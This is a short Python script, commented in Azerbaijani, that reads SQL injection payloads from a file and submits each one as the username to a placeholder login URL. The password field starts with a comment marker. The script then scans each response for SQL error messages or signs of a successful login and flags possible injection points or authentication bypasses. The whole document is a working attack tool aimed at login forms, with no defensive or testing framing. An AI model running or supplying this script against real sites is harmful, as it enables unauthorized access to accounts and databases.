import requests

url = "https://sehifenin_login_hissesi"  # hədəf login URL
headers = {
    "User-Agent": "Mozilla/5.0"
}

with open("sql_injection.txt", "r", encoding="utf-8") as f:
    for line in f:
        payload = line.strip()

        data = {
            "username": payload,
            "password": "--2a3qsw4erftg"  # basqa bir yazida yazmaq olardi amma yorum kimi olsun deye -- istiafde etdim daha qarantili
        }

        try:
            response = requests.post(url, data=data, headers=headers)

            # Əgər invalid password yazılırsa, amma username yanlışdırsa, deməli injection ola bilər
            if "syntax error" in response.text or "mysql" in response.text or "SQL" in response.text:
                print(f"SQL Error cavabı ilə ehtimal: {payload}")
            elif "Welcome" in response.text or "dashboard" in response.text:
                print(f"Login bypass ola bilər: {payload}")
            else:
                print(f"Təsir yoxdur: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Xəta baş verdi: {e}")
